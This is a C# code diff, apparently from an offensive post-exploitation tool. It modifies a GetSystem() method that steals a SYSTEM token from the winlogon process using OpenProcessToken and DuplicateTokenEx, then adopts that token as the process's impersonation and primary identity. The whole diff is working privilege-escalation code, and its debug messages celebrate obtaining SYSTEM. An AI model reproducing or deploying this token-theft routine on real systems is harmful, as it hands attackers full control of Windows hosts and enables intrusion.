@@ -207,12 +207,12 @@ public class IdentityManager : IIdentityManager
         }
     }
 
-    public (bool, IntPtr) GetSystem()
+    public bool GetSystem()
     {
         lock (_identitySync)
         {
             if (GetIntegrityLevel() is not IntegrityLevel.HighIntegrity)
-                return (false, IntPtr.Zero);
+                return false;
 
             IntPtr hToken = IntPtr.Zero;
             IntPtr hDupToken = IntPtr.Zero;
@@ -221,7 +221,7 @@ public class IdentityManager : IIdentityManager
             {
                 System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName("winlogon");
                 if (processes.Length == 0)
-                    return (false, IntPtr.Zero);
+                    return false;
 
                 IntPtr handle = processes[0].Handle;
                 bool success = _OpenProcessToken(
@@ -232,7 +232,7 @@ public class IdentityManager : IIdentityManager
                 if (!success)
                 {
                     DebugHelp.DebugWriteLine("[!] GetSystem() - OpenProcessToken failed!");
-                    return (false, IntPtr.Zero);
+                    return false;
                 }
 
                 success = _DuplicateTokenEx(
@@ -246,16 +246,20 @@ public class IdentityManager : IIdentityManager
                 if (!success)
                 {
                     DebugHelp.DebugWriteLine("[!] GetSystem() - DuplicateTokenEx failed!");
-                    return (false, IntPtr.Zero);
+                    return false;
                 }
 
                 DebugHelp.DebugWriteLine("[+] Got SYSTEM token!");
-                return (true, hDupToken);
+                SetImpersonationIdentity(hDupToken);
+                SetPrimaryIdentity(hDupToken);
+                return true;
             }
             finally
             {
                 if (hToken != IntPtr.Zero)
                     _CloseHandle(hToken);
+                if (hDupToken != IntPtr.Zero)
+                    _CloseHandle(hDupToken);
             }
         }
     }
